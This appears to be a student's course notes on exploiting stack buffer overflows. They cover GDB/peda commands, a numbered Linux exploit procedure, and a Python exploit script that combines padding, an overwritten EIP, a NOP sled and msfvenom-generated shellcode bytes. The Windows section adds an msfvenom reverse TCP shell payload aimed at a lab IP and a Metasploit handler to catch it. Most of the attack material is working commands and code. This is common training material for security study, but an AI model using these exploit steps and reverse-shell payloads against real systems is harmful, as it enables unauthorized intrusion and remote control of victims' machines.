
# Buffer Overflow Common Terms
* Heap
* Stack
* Registers
* Instruction Pointer
* Stack Pointer
* Base Pointer
* Function
* Shellcode
# Buffer Overflow Defenses
* Non executable (NX) Stack
* Address Space Layout Randomization (ASLR)
* Data Execution Prevention (DEP)
* Stack Canaries
* Position Independent Excutable (PIE)
# GDB Uses
* installation pf peda plugin
    git clone https://github.com/longld/peda.git ~/peda
    echo "source ~/peda/peda.py" >> ~/.gdbinit
### Common Commands
```
disass <FUNCTION>     # Disassemble portion of the program
info <...>    # Supply info for specific stack areas
x/256c $<REGISTER>    # Read characters from specific register
break <address>    # Establish a break point
run <<<$(echo "asdfghjlklk")    # Goes into standard in of program. It makes it take an arguement before running the program
info functions    # Lists all the functions
pdisass main    # Lists the main function. (Can do this to any function)
info proc map    # Gets a map of the process
```
# Demo Linux
* [Buffer-Overflow-Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
  - Look for "EIP" It should have a specific value from the characters you overflowed it with, copy the hex value determine the overflow amount
* To see the size of the stack, do "info proc map" and note the line with [heap], the line below that has a start addr (this is the start of the stack). Note the end addr of the line that has [stack] in it.
* find /b command:
  - `0xff` is jmp
  - `0xe4` is ESP
* `\x90` is NOP
```
run ./func <<<$(echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa")  # what thi does id run func and uses command substitution starting at the gators to input bad strings
   
# Find out the overflow value
# Exit
# Enter a fresh gdb session without peda
*STEP 1 env - gdb ./func    # This allows you to do that ^
* pdisass getuserinput # shows code for a function called getuserinput
* shell takes you to your lin ops lines type exit to go back to gdb
* type run then do the overflow of characters 
* show env    # Lists variables
## run <<<$(./buff.py)   # redirects the input to run the file we created that will spam "A" however many times we want
## copy hex value in the EIP after the 0x

```
 #!/usr/bin/env python 
   
   buffer = "A" * 62
   eip = "BBBB"
   
   print(buffer+eip)
```
## the code aboce does a buffer overflow and replaces the EIP to check for validity 
## * unset env <variable>    # This unsets a variable
* info proc map    # Gets a map of the process after the crash
```
crash:
tarting program: /home/student/func 
Enter a string: 
ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd

Program received signal SIGSEGV, Segmentation fault.
0x64646464 in ?? ()
```            1            2       3     4
* find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4    # find /b <starting location of stack>, <ending location of the stack>, <jmp>, <esp>
# Take first 4 and make them little endian
```
### Flipping bytes from big to little endian
```
#0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
#0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"
```
### MSFVENOM Command
* We are tellig it do create a payload that executes msf
* Then we are telling it that its going to execute the whoami command (1)
* Then then tell it to not use the NULL Byte (2)
* Finally we tell it to format it to python (3)
```                              1           2         3
msfvenom -p /linux/x86/exec CMD=whoami -b '\x00' -f python    # Creates payload
msfvenom --list payloads    # Lists all the payloads
```
## shell code we push onto the program 
buf =  b""
buf += b"\xba\xf9\xfc\xc9\x23\xdd\xc3\xd9\x74\x24\xf4\x58"
buf += b"\x31\xc9\xb1\x0b\x83\xe8\xfc\x31\x50\x10\x03\x50"
buf += b"\x10\x1b\x09\xa3\x28\x83\x6b\x66\x49\x5b\xa1\xe4"
buf += b"\x1c\x7c\xd1\xc5\x6d\xea\x22\x72\xbd\x88\x4b\xec"
buf += b"\x48\xaf\xde\x18\x4d\x2f\xdf\xd8\x25\x47\xb0\xb9"
buf += b"\xa4\xfe\x4e\x6d\x64\x89\xae\x5c\x0a"

## how to generate shell code via msfconsole
payload/linux/x86/exec
show options 
set cmd whoami
    then show options to verify

## your script to get the code to work should be this (shell code is buf and is variable)
!/usr/bin/env python 
   
buffer = "A" * 62
eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 15
buf =  b""
buf += b"\xbb\x35\x5d\x8c\xf4\xd9\xed\xd9\x74\x24\xf4\x5a"
buf += b"\x2b\xc9\xb1\x0b\x31\x5a\x14\x83\xea\xfc\x03\x5a"
buf += b"\x10\xd7\xa8\xe6\xff\x4f\xca\xa5\x99\x07\xc1\x2a"
buf += b"\xef\x30\x71\x82\x9c\xd6\x82\xb4\x4d\x44\xea\x2a"
buf += b"\x1b\x6b\xbe\x5a\x1c\x6b\x3f\x9b\x54\x03\x50\xfa"
buf += b"\xf7\xba\xae\xab\x54\xb5\x4e\x9e\xdb"
print(buffer+eip+nop+buf)

then run on the gdb-peda with: run <<<$(./buff.py)


once the script and stuff works for a windows machine all you need to change on the script is the EIP

## steps to do for exploiting a buffer overflow 
1. env - gdb ./FILE or gdb
2. run the file and spam characters from the generator to get a segmentation fault
3. unset the envs, 
4. then run info proc map
5. run find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
6. Take first 4 and make them little endian
7. take the first one and make it your eip 
8.generate shellcode with msfvenom
9. store into the script then run
        (file ./<file> then type: run <<< $(./<script>)

```
# Demo Windows
### The Setup
* Run strings.exe on the executable
* Look for vulnerable variables
* Go to [Buffer-Overflow-Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) and generate the string that will narrow the buffer offset
* Make the python [script](scripts.md)
* Make sure the program crashes and the EIP returns with the value you set
### Immunity Debugger
```
!mona modules    # This looks for vulnerable variables
!mona jmp -r esp -m "essfunc.dll"    # Looks through the variable for jmp and esp
```
### MSFVENOM COMMAND (lhost='LinOPS IP' lport='RHP')
```
msfvenom -p windows/shell/reverse_tcp lhost=10.50.30.231 lport=1234 -b "\x00" -f python
```
### MSFCONSOLE
```
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport <PORT SET IN MSFVENOM>
run
```

